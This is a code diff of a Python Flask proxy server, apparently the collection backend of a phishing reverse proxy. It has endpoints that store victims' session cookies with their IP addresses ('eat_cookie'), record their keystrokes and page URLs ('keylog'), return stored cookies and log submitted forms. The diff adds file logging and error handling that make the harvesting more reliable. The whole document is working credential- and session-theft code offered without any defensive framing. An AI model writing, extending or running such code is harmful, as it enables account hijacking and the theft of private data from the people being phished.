@@ -1,5 +1,5 @@
 from flask import Flask, request, Response, send_from_directory, jsonify
-import requests, re, json, os
+import requests, re, json, os, logging, sys
 from datetime import datetime
 import brotli
 
@@ -14,6 +14,24 @@ if not os.path.exists('requests.json'):
 
 requests_history = []
 MAX_HISTORY = 50
+
+# Setup logging
+logging.basicConfig(
+    filename='proxy.log',
+    level=logging.INFO,
+    format='%(asctime)s - %(levelname)s - %(message)s',
+    datefmt='%Y-%m-%d %H:%M:%S'
+)
+
+# Redirect stdout and stderr to file
+sys.stdout = open('proxy.log', 'a')
+sys.stderr = open('proxy.log', 'a')
+
+def log_to_file(message, level='info'):
+    if level == 'error':
+        logging.error(message)
+    else:
+        logging.info(message)
 
 def start_proxy(target, host, port, secret):
     app = Flask(__name__)
@@ -32,28 +50,29 @@ def start_proxy(target, host, port, secret):
 
     @app.route('/ep/api/ping', methods=['POST'])
     def eat_cookie():
-        cookies = request.cookies
-        user_ip = request.remote_addr
-        timestamp = datetime.now().isoformat()
-
-        cookie_data = []
-        for key, value in cookies.items():
-            cookie_data.append({
-                'name': key,
-                'value': value,
-                'timestamp': timestamp,
-                'ip': user_ip
-            })
-
-        with open('cookies.json', 'r') as f:
-            existing_cookies = json.load(f)
-
-        existing_cookies.extend(cookie_data)
-
-        with open('cookies.json', 'w') as f:
-            json.dump(existing_cookies, f)
-
-        return jsonify({'message': 'Pong!'}), 200
+        try:
+            cookies = request.json.get('cookies', [])
+            user_ip = request.remote_addr
+            timestamp = datetime.now().isoformat()
+            
+            log_to_file(f"Cookies received from {user_ip} at {timestamp}")
+            
+            with open('cookies.json', 'r') as f:
+                existing_cookies = json.load(f)
+            
+            for cookie in cookies:
+                cookie['ip'] = user_ip
+                cookie['timestamp'] = timestamp
+            
+            existing_cookies.extend(cookies)
+            
+            with open('cookies.json', 'w') as f:
+                json.dump(existing_cookies, f)
+            
+            return jsonify({'status': 'success'}), 200
+        except Exception as e:
+            log_to_file(f"Error in eat_cookie: {str(e)}", 'error')
+            return jsonify({'error': str(e)}), 500
 
     @app.route('/ep/api/getCookies', methods=['GET'])
     def get_cookies():
@@ -118,19 +137,25 @@ def start_proxy(target, host, port, secret):
 
     @app.route('/ep/api/keylog', methods=['POST'])
     def keylog():
-        data = request.json
-        timestamp = datetime.now().isoformat()
-        log_entry = {
-            'keys': data['keys'],
-            'url': data['url'],
-            'timestamp': timestamp,
-            'ip': request.remote_addr
-        }
-        
-        with open('keylogs.json', 'a+') as f:
-            f.write(json.dumps(log_entry) + '\n')
-        
-        return jsonify({'status': 'success'})
+        try:
+            data = request.json
+            timestamp = datetime.now().isoformat()
+            log_entry = {
+                'keys': data['keys'],
+                'url': data['url'],
+                'timestamp': timestamp,
+                'ip': request.remote_addr
+            }
+            
+            log_to_file(f"Keylog received from {request.remote_addr} at {timestamp}")
+            
+            with open('keylogs.json', 'a+') as f:
+                f.write(json.dumps(log_entry) + '\n')
+            
+            return jsonify({'status': 'success'})
+        except Exception as e:
+            log_to_file(f"Error in keylog: {str(e)}", 'error')
+            return jsonify({'error': str(e)}), 500
 
     @app.route('/ep/api/forms', methods=['POST'])
     def log_form():
